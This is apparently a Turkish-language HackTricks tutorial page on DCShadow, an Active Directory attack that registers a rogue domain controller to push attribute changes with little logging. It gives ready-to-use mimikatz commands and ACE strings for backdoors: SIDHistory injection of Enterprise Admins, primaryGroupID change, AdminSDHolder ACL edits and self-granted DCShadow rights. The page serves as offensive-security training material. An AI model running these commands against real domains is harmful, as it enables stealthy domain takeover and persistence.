{{#include ../../banners/hacktricks-training.md}}

# DCShadow

AD'de **yeni bir Domain Controller** kaydeder ve belirtilen nesnelerde **değişiklikler** ile ilgili herhangi bir **log** bırakmadan **atributları** (SIDHistory, SPNs...) **itmek** için kullanır. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde olmanız gerekir.\
Yanlış veri kullanırsanız, oldukça çirkin loglar ortaya çıkacaktır.

Saldırıyı gerçekleştirmek için 2 mimikatz örneğine ihtiyacınız var. Bunlardan biri, burada gerçekleştirmek istediğiniz değişiklikleri belirtmeniz gereken SYSTEM ayrıcalıklarıyla RPC sunucularını başlatacaktır ve diğer örnek değerleri itmek için kullanılacaktır:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Dikkat edin ki **`elevate::token`** `mimikatz1` oturumunda çalışmayacak çünkü bu, iş parçacığının ayrıcalıklarını yükseltti, ancak biz **işlemin ayrıcalığını** yükseltmemiz gerekiyor.\
Ayrıca bir "LDAP" nesnesi seçebilirsiniz: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Değişiklikleri bir DA'dan veya bu minimum izinlere sahip bir kullanıcıdan gönderebilirsiniz:

- **alan nesnesinde**:
- _DS-Install-Replica_ (Alan içinde Replica Ekle/Kaldır)
- _DS-Replication-Manage-Topology_ (Replikasyon Topolojisini Yönet)
- _DS-Replication-Synchronize_ (Replikasyon Senkronizasyonu)
- **Yapılandırma konteynerindeki** **Siteler nesnesi** (ve çocukları):
- _CreateChild and DeleteChild_
- **DC olarak kaydedilen** **bilgisayar nesnesi**:
- _WriteProperty_ (Yazma değil)
- **hedef nesne**:
- _WriteProperty_ (Yazma değil)

Bu ayrıcalıkları ayrıcalıksız bir kullanıcıya vermek için [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) komutunu kullanabilirsiniz (bu bazı günlükler bırakacaktır). Bu, DA ayrıcalıklarına sahip olmaktan çok daha kısıtlayıcıdır.\
Örneğin: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Bu, _**mcorp-student1**_ makinesinde oturum açtığında _**student1**_ kullanıcı adının _**root1user**_ nesnesi üzerinde DCShadow izinlerine sahip olduğu anlamına gelir.

## DCShadow Kullanarak Arka Kapılar Oluşturma
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - DCShadow kullanarak DCShadow izinleri verin (değiştirilmiş izin günlükleri yok)

Aşağıdaki ACE'leri kullanıcı SID'imizle birlikte eklememiz gerekiyor:

- Alan nesnesinde:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Saldırgan bilgisayar nesnesinde: `(A;;WP;;;UserSID)`
- Hedef kullanıcı nesnesinde: `(A;;WP;;;UserSID)`
- Yapılandırma konteynerindeki Siteler nesnesinde: `(A;CI;CCDC;;;UserSID)`

Bir nesnenin mevcut ACE'sini almak için: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Bu durumda **birden fazla değişiklik** yapmanız gerektiğini unutmayın, sadece bir tane değil. Bu nedenle, **mimikatz1 oturumu** (RPC sunucusu) içinde yapmak istediğiniz her değişiklik için **`/stack`** parametresini kullanın. Bu şekilde, tüm sıkışmış değişiklikleri sahte sunucuda gerçekleştirmek için yalnızca bir kez **`/push`** yapmanız gerekecek.

[**DCShadow hakkında daha fazla bilgi için ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
